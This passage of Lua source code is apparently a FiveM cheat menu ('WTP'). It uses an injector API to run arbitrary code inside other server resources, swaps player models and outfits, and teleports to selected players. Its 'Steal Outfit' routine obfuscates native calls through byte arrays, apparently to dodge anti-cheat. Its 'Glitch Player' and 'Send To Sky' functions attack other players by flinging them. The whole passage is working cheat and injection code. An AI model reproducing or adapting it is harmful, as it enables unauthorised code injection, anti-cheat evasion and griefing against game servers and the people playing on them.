                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        {
                            type = "scrollable",
                            label = "Freemode",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Freemode Male", "Freemode Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade", "Dave Norton", 
                                "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad", 
                                "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male", "Sheriff Female",
                                "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
                                "Construction Worker", "Pilot Male", "Pilot Female", "Business Male", "Business Female",
                                "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1", "Ballas 2", "Ballas Female",
                                "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2", "Lost MC Female",
                                "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard", "Cop Undercover",
                                "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1", "Prostitute 2",
                                "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater", "Hipster Male", "Hipster Female",
                                "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver", "Gardener", "Farmer",
                                "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
                                "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
                                "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female", "Tennis Player Male", "Tennis Player Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Animal Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = { 
                                "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow", 
                                "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky", 
                                "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle", 
                                "Pug", "Poodle", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
                                "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark", 
                                "Hammerhead Shark", "Cow", "Cat2", "Chickenhawk", "Cormorant",
                                "Coyote2", "Chimp2", "Boar2", "Deer2", "Fish2", "Husky2",
                                "Pug2", "Poodle2", "Retriever2", "Shepherd2", "Rat2", "Rabbit2",
                                "Dolphin2", "Killer Whale2", "Mountain Lion2", "Pig2", "Seagull2",
                                "Stingray2", "Tiger Shark2", "Hammerhead Shark2"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)
                                    end
                                ]]):format(value))
                            end
                        },
                        { type = "divider", label = "Outfit Cycler" },
                        {
                            type = "scrollable",
                            label = "Hat",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedPropDrawableVariations(ped, 0)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    local ped = PlayerPedId()
                                    ClearPedProp(ped, 0)
                                    SetPedPropIndex(ped, 0, tonumber(%s), 0, true)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Mask",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 1)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 1, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Shirt",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 11)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 11, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Jacket",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()

                                local max = GetNumberOfPedDrawableVariations(ped, 7)
                                if max == 0 then
                                    max = GetNumberOfPedDrawableVariations(ped, 11)
                                end

                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    local ped = PlayerPedId()

                                    if GetNumberOfPedDrawableVariations(ped, 7) > 0 then
                                        SetPedComponentVariation(ped, 7, tonumber(%s), 0, 0)
                                    else
                                        SetPedComponentVariation(ped, 11, tonumber(%s), 0, 0)
                                    end
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Pants",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 4)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 4, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Shoes",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 6)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 6, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Hands / Arms",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedDrawableVariations(ped, 3)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    SetPedComponentVariation(PlayerPedId(), 3, tonumber(%s), 0, 0)
                                ]], v))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Glasses",
                            scrollType = "onEnter",
                            value = 1,
                            values = (function()
                                local ped = PlayerPedId()
                                local max = GetNumberOfPedPropDrawableVariations(ped, 1)
                                local t = {}
                                for i = 0, max do t[#t+1] = tostring(i) end
                                return t
                            end)(),
                            onSelect = function(v)
                                MachoInjectResourceRaw('illenium-appearance', string.format([[
                                    local ped = PlayerPedId()
                                    ClearPedProp(ped, 1)
                                    SetPedPropIndex(ped, 1, tonumber(%s), 0, true)
                                ]], v))
                            end
                        },
                        { type = "divider", label = "Illenium Appearance" },
                        { icon = "", type = "scrollable", value = 1, values = { "Clothing Menu", "Save Outfit", "Reload Skin", "Barber Shop", "Tattoo Shop"}, label = "Appearance",
                            onSelect = function(value)
                                if value == "Clothing Menu" then
                                    if GetResourceState("ars_ambulancejob") == "started" then
                                        MachoInjectResource2(NewThreadNs, 'ars_ambulancejob', [[
                                            openWardrobe()
                                        ]])
                                    elseif GetResourceState("cfx-praryo-groups") == "started" then
                                        executeCode('cfx-praryo-groups', [[
                                            WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:openOutfitMenuPraryo') 
                                        ]])
                                    elseif GetResourceState("cfx-xfx-basicneeds") == "started" then
                                        executeCode('cfx-xfx-basicneeds', [[
                                            WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:xYy:openClothingShopMenu') 
                                        ]])
                                    else
                                        executeCode('any', [[
                                            WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:openClothingShop', true) 
                                        ]])
                                    end
                                elseif value == "Save Outfit" then
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:saveOutfit')
                                    ]])
                                elseif value == "Reload Skin" then
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:reloadSkin')
                                    ]])
                                elseif value == "Barber Shop" then
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:OpenBarberShop', true)
                                    ]])
                                elseif value == "Tattoo Shop" then
                                    executeCode('any', [[
                                        WTP.SafeRunNative(TriggerEvent, 'illenium-appearance:client:OpenTattooShop', true)
                                    ]])
                                end
                            end
                        },
                    },
                },
            }
        },
        {
            icon = "ph ph-user",
            label = "Online Options",
            type = "subMenu",
            categories = {
                {
                    label = "List",
                    tabs = {
                        { type = "button", label = "Select Everyone" },
                        { type = "button", label = "Un-Select Everyone" },
                        { type = "button", label = "Clear Selection" },
                        { type = "divider", label = "Nearby Players" },
                    }
                },
                {
                    label = "Safe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = {"Player", "Vehicle"}, label = "Teleport", desc = 'This will teleport you to the selected player',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end
                                if value == "Player" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        local player = GetPlayerFromServerId(playerId)
                                        if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                            self:Notify("error", "WTP", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                            CPlayers[playerId] = nil
                                            WTP:UpdateListMenu()
                                            return
                                        end

                                        executeCode('any', string.format([[
                                            local targetID = %d
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                            local mePed = PlayerPedId()

                                            if DoesEntityExist(targetPed) then
                                                local coords = GetEntityCoords(targetPed)
                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, coords.x, coords.y, coords.z, false, false, false)
                                            end
                                        ]], playerId))
                                        self:Notify("success", "WTP", ("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(playerId)), playerId), 3000)
                                    end
                                elseif value == "Vehicle" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        local player = GetPlayerFromServerId(playerId)
                                        if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                            self:Notify("error", "WTP", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                            CPlayers[playerId] = nil
                                            WTP:UpdateListMenu()
                                            return
                                        end

                                        local veh = GetVehiclePedIsIn(GetPlayerPed(player), 0)

                                        if IsVehicleSeatFree(veh, 0) then
                                            SetPedIntoVehicle(PlayerPedId(), veh, 0)
                                        else
                                            if IsVehicleSeatFree(veh, 1) then
                                                SetPedIntoVehicle(PlayerPedId(), veh, 1)
                                            else
                                                if IsVehicleSeatFree(veh, 2) then
                                                    SetPedIntoVehicle(PlayerPedId(), veh, 2)
                                                else
                                                    if IsVehicleSeatFree(veh, 3) then
                                                        SetPedIntoVehicle(PlayerPedId(), veh, 3)
                                                    else
                                                        self:Notify("error", "WTP", "No free seats in vehicle", 3000)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        },
                        { type = "button", label = "Steal Outfit",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetServerId = targetPlayers[1]
                                local function _b(str)
                                    local t = {}
                                    for i = 1, #str do t[i] = string.byte(str, i) end
                                    return t
                                end
                                local function _d(tbl)
                                    local s = ""
                                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                    return s
                                end
                                local function _g(n)
                                    local k = _d(n)
                                    local f = _G[k]
                                    return f
                                end

                                local function findClientIdByServerId(sid)
                                    local players = _g(_b("GetActivePlayers"))()
                                    for _, pid in ipairs(players) do
                                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                                            return pid
                                        end
                                    end
                                    return -1
                                end

                                local function CopyClothing(targetSid)
                                    local clientId = findClientIdByServerId(targetSid)
                                    if clientId == -1 then
                                        return
                                    end

                                    local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                    local myPed = _g(_b("PlayerPedId"))()

                                    if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                        _g(_b("SetPedComponentVariation"))(myPed, 1,  _g(_b("GetPedDrawableVariation"))(targetPed, 1),  _g(_b("GetPedTextureVariation"))(targetPed, 1),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 3,  _g(_b("GetPedDrawableVariation"))(targetPed, 3),  _g(_b("GetPedTextureVariation"))(targetPed, 3),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 4,  _g(_b("GetPedDrawableVariation"))(targetPed, 4),  _g(_b("GetPedTextureVariation"))(targetPed, 4),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 6,  _g(_b("GetPedDrawableVariation"))(targetPed, 6),  _g(_b("GetPedTextureVariation"))(targetPed, 6),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 8,  _g(_b("GetPedDrawableVariation"))(targetPed, 8),  _g(_b("GetPedTextureVariation"))(targetPed, 8),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 9,  _g(_b("GetPedDrawableVariation"))(targetPed, 9),  _g(_b("GetPedTextureVariation"))(targetPed, 9),  0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 10, _g(_b("GetPedDrawableVariation"))(targetPed, 10), _g(_b("GetPedTextureVariation"))(targetPed, 10), 0)
                                        _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)

                                        _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                        _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                        _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                    end
                                end

                                CopyClothing(targetServerId)
                                self:Notify("success", "WTP", "Copied clothing!", 5000)
                            end
                        },
                        { type = "button", label = "Glitch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local mySid = GetPlayerServerId(PlayerId())

                                CreateThread(function()
                                    for i = 1, #targetPlayers do
                                        local sid = tonumber(targetPlayers[i])
                                        if sid and sid ~= mySid then
                                            MachoInjectResource(targetSafeRes, string.format([[
                                                local kinginaRunning = false
                                                local NEARBY_RADIUS = 300.0

                                                local function doKingina(targetPed, originalCoords)
                                                    local myPed = PlayerPedId()
                                                    if not DoesEntityExist(myPed) then return end
                                                    if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then return end

                                                    local targetCoords = GetEntityCoords(targetPed)
                                                    local teleported = false

                                                    if #(originalCoords - targetCoords) > 8.0 then
                                                        local angle = math.random() * 2 * math.pi
                                                        local radiusOffset = math.random(5, 9)

                                                        SetEntityCoordsNoOffset(
                                                            myPed,
                                                            targetCoords.x + math.cos(angle) * radiusOffset,
                                                            targetCoords.y + math.sin(angle) * radiusOffset,
                                                            targetCoords.z,
                                                            false, false, false
                                                        )

                                                        SetEntityVisible(myPed, false, false)
                                                        teleported = true
                                                        Wait(120)
                                                    end

                                                    ClearPedTasksImmediately(myPed)

                                                    SetEntityCoordsNoOffset(
                                                        myPed,
                                                        targetCoords.x,
                                                        targetCoords.y,
                                                        targetCoords.z + 0.5,
                                                        false, false, false
                                                    )

                                                    Wait(50)

                                                    AttachEntityToEntityPhysically(
                                                        myPed,
                                                        targetPed,
                                                        0,
                                                        0.0, 0.0, 0.0,
                                                        150.0, 0.0, 0.0,
                                                        0.0, 0.0, 0.0,
                                                        1, false, false, 1, 2
                                                    )

                                                    Wait(160)
                                                    DetachEntity(myPed, true, true)

                                                    ClearPedTasksImmediately(myPed)
                                                    ClearPedSecondaryTask(myPed)
                                                    SetEntityCollision(myPed, true, true)
                                                    SetEntityAlpha(myPed, 255, false)
                                                    SetEntityVisible(myPed, true, false)
                                                    SetPedCanRagdoll(myPed, false)
                                                    FreezeEntityPosition(myPed, false)

                                                    Wait(10)

                                                    SetEntityCoordsNoOffset(
                                                        myPed,
                                                        originalCoords.x,
                                                        originalCoords.y,
                                                        originalCoords.z,
                                                        false, false, false
                                                    )

                                                    if teleported then
                                                        SetEntityVisible(myPed, true, false)
                                                    end
                                                end

                                                CreateThread(function()
                                                    if kinginaRunning then return end
                                                    kinginaRunning = true

                                                    local myPed = PlayerPedId()
                                                    if not DoesEntityExist(myPed) then kinginaRunning = false return end

                                                    local originalCoords = GetEntityCoords(myPed)

                                                    local sid = %d
                                                    local player = GetPlayerFromServerId(sid)
                                                    if not player or player == -1 then kinginaRunning = false return end

                                                    local targetPed = GetPlayerPed(player)
                                                    if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then kinginaRunning = false return end

                                                    doKingina(targetPed, originalCoords)

                                                    kinginaRunning = false
                                                end)
                                            ]], sid))
                                        end
                                    end
                                end)
                                self:Notify("success", "WTP", "Attempting to Glitch Player", 5000)
                            end
                        },
                        { type = "button", label = "Send To Sky", desc = 'This will Send To Sky the target.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                executeCode("any", string.format([[
                                    local targetServerId = %s
                                    local playerPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(playerPed)

